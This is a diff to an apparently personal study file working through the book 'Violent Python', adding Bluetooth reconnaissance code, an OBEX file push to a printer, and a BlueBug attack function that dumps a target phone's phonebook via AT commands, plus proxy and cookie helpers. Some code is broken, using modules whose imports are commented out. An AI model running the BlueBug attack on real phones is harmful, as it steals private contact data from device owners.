@@ -9,10 +9,12 @@ import time
 import dpkt
 import crypt
 import urllib
+# import obexftp
 import sqlite3
 import pexpect
 import zipfile
 import optparse
+# import cookielib - no longer cookielib in python3
 import mechanize
 import urllib.parse
 from socket import *
@@ -1959,4 +1961,100 @@ def rfcomm_conn(addr, port):
         print("Port's closed homie")
 
 # The bluetooth service discovery protocol - enumerates types of profiles and services offered by
-# bluetooth devices.
+# bluetooth devices. If you pass the function below a MAC address, it lists out the services 
+# given by it on the port.
+
+def sdp_browse(addr):
+    services = find_service(address=addr)
+    for service in services:
+        name = service['name']
+        protocol = service['protocol']
+        port = str(service['port'])
+        print("[+] Found {} with protocol {} on port #{}".format(name, protocol, port))
+
+# In the book, the author finds a printer with offers OBEX object push profile on RFCOMM
+# port 2. This is akin to anonymous FTP to the printer, which gives control to it, if you
+# know where to look. Let's try to get the printer to print a photo of a ninja.
+# Pro tip: Writing frequent log messages while coding is a very helpful investment. Also,
+# this was easy! The tough part was actually determining what services the printer offered
+# and how.
+
+def print_ninja():
+    try:
+        bt_printer = obexftp.client(obexftp.BLUETOOTH)
+        bt_printer.connect('00:16:38:DE:AD:11', 2)
+        bt_printer.put_file('/tmp/ninja.jpeg')
+    except:
+        print("[-] Failed to print the ninja")
+
+# The BlueBug attack - using RFCOMM channels yet again. In past firmwares of phones, this 
+# channel required no authentication, so an attacker could willy nilly connect to it. The 
+# book states that AT commands are used, which different from cronjobs in the sense that 
+# cronjobs are reoccuring while AT commands run once in the future. 
+#
+# Hold up, the book may very well be discussing a different sort of AT command (I presumed it
+# to be Linux's at command), but the book states that a simple AT+CPBR = 1 means the first 
+# contact in the phonebook o.O. Yep, the book is talking about the Hayes command set, used to
+# dial, hangup, etc.
+
+def blue_bug_attack():
+    target_phone = "AA:BB:CC:DD:EE:FF"
+    port = 17
+    phone_sock = BluetoothSocket(RFCOMM)
+    phone_sock.connect((target_phone, port))
+    for contact in range(1, 5):
+        at_cmd = f"AT+CPBR={str(contact)}\n"
+        phone_sock.send(at_cmd)
+        response = phone_sock.recv(1024)
+        print("[+] {}: {}".format(str(contact), response))
+
+# This will dump the first five contacts from a phone's phonebook. Moral of the story: a lot
+# can be done with MAC addresses, port scanning, and python. Beware!
+
+#####################################################################
+# Chapter 6
+#####################################################################
+
+def view_page(url):
+    browser = mechanize.Browser()
+    page = browser.open(url)
+    source_code = page.read()
+    print(source_code)
+
+# You've done quite a lot of web scraping on the internet, so maybe now's the time to explore
+# more about how to stay anonymous while doing these escapades. This is because using the requests
+# library is no different to going to the browser yourself and doing whatever it is you're doing.
+# How do you hide yourself? First of all, you should know how the web tracks you. Whenever you
+# make a request to a server, it logs your IP address. This can be solved by the use of VPNs or
+# proxies. Let's begin here. You can pass proxies to the requests module pretty easily by giving
+# it a dictionary.
+
+def test_proxy(url, proxy):
+    browser = mechanize.Browser()
+    print("[!] Opened the browser")
+    browser.set_proxies(proxy)
+    print("[!] Set the proxies")
+    page = browser.open(url)
+    print("[!] Opened the URL")
+    source_code = page.read()
+    print(source_code)
+
+# Another way to determine the machine is the User-Agent header in requests. HAHAHA, recently
+# a scandal arose where a travel agency website found macbook users through user agents and gave
+# them more expensive options. And, to no surprise, there's actually a website (useragentstring.com
+# or something along those lines), which you can use to pass in custom user agents.
+
+# Finally, cookies are another way web servers determine some interesting information about clients.
+# Let's use the cookielib standard library to see what's up (this has been changed to http.cookiejar in
+# python3x, so check out the differences). 
+
+def print_cookies(url):
+    browser = mechanize.Browser()
+    cookie_jar = cookielib.LWPCookieJar()
+    browser.set_cookiejar(cookie_jar)
+    _ = browser.open(url)
+
+    for cookie in cookie_jar:
+        print(cookie)
+
+# Now the book proceeds into discussing beautifulsoup.
